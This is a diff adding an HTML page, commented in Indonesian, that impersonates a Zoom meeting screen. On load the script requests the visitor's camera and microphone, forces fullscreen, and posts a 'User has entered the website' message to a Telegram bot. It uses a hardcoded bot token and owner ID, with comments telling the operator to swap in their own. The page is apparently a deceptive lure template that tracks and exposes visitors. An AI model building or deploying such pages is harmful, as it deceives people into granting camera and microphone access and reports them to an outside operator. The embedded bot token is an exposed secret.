@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom - Meeting</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="video-container">
+    <video id="userVideo" autoplay playsinline></video>
+  </div>
+
+  <!-- Bar bagian bawah dengan gambar memanjang -->
+  <div class="bottom-bar">
+    <img src="https://files.catbox.moe/mkpj7q.png" alt="Bottom Bar">
+  </div>
+
+  <script>
+    const video = document.getElementById('userVideo');
+    const ownerId = '7377733784'; // Ganti dengan owner ID Anda
+    const botToken = '7512836049:AAHB9STFF0Qxzg5ryLs6Gc7idtdBFJJBGYE'; // Ganti dengan token bot Anda
+
+    // Akses kamera dan mikrofon pengguna
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        video.srcObject = stream;
+      })
+      .catch((error) => {
+        console.error('Error accessing camera or microphone:', error);
+      });
+
+    // Fungsi untuk mengirim pesan ke bot Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: ownerId,
+        text: message,
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+        const result = await response.json();
+        console.log('Message sent:', result);
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    // Contoh penggunaan: Kirim pesan ke Telegram saat halaman dimuat
+    window.onload = () => {
+      sendToTelegram('User has entered the website.');
+    };
+
+    // Aktifkan fullscreen saat halaman dimuat
+    document.documentElement.requestFullscreen().catch((error) => {
+      console.error('Error attempting to enable fullscreen:', error);
+    });
+  </script>
+</body>
+</html>
